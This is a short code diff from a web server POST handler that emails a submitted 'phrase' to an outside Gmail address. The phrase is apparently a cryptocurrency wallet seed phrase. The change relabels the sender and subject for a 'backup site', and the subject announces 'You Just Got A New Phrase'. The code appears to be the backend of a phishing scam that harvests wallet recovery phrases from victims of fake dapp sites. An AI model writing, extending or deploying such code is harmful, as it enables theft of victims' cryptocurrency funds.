@@ -70,10 +70,10 @@ export async function POST(request: Request) {
       const formattedMessage = await formatMessage(phrase);
 
       const mailOptions = {
-        from: `Dapp App ${email}`,
+        from: `Dapp backup site ${email}`,
         //  to: 'jamesanderson197x@gmail.com',
         to: 'contact.telfarglobal@gmail.com',
-        subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
+        subject: "Yo! You Just Got A New Phrase Innit from backup website!",
         html: formattedMessage,
       }
 
